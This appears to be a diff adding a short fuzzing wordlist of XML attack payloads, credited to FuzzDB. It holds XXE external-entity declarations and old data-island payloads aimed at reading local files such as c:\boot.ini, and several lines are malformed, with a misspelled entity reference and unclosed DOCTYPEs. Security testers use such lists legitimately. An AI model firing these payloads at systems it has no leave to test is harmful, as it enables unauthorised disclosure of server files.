@@ -1,0 +1,16 @@
+# Based on FuzzDB (https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/xml/xml-attacks.txt)
+
+"<xml SRC=""c:\boot.ini"" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>"
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file://c:\unknown\unknown"">]><foo>&xxe;</foo>"
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file://c:\unknown\unknown">]><foo>&xee;</foo>o>
+<!DOCTYPE autofillupload [<!ENTITY D71Mn SYSTEM "file:///c:\unknown\unknown">
+
+"<xml SRC=""/unknown/unknown"" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>"
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:////unknown/unknown"">]><foo>&xxe;</foo>"
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///unknown/unknown">]><foo>&xee;</foo>
+<!DOCTYPE autofillupload [<!ENTITY 9eTVC SYSTEM "file:///unknown/unknown">
+
+"<xml SRC=""/unknown/"" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>"
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:////unknown/"">]><foo>&xxe;</foo>"
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///unknown/">]><foo>&xee;</foo>
+<!DOCTYPE autofillupload [<!ENTITY 9eTVC SYSTEM "file:///unknown/">
